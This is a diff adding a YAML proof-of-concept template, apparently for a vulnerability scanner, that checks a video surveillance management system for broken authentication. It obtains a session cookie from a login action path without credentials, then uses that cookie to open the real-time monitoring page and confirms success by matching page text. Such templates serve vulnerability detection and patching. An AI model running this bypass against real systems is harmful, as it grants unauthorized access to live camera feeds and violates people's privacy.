@@ -1,0 +1,21 @@
+id: poc-yaml-video-surveillance-system-failed-authentication
+info:
+  name: 视频监控管理系统-失效的身份认证
+  severity: high
+  tags:
+  - 认证绕过
+  finger: 视频监控管理系统
+requests:
+- method: GET
+  path: /mgrcter/usermgr/user/Login.action
+  expression: status_code == 200 && contains(body, "{\"success\":true,\"msg\":\"\"}")
+  output:
+  - regex_match(headers, "SESSIONID=(?P<cookie>.*?);")
+- method: GET
+  path: /monitor/realt/init?curPageId=a1
+  headers:
+    Cookie: JSESSIONID={{.cookie}}
+  expression: status_code == 200 && contains(body, "<title>实时监控</title>") && contains(body,
+    "<td align=\"right\" width=\"100\">GPS保存天数：</td>")
+variables: {}
+transport: http
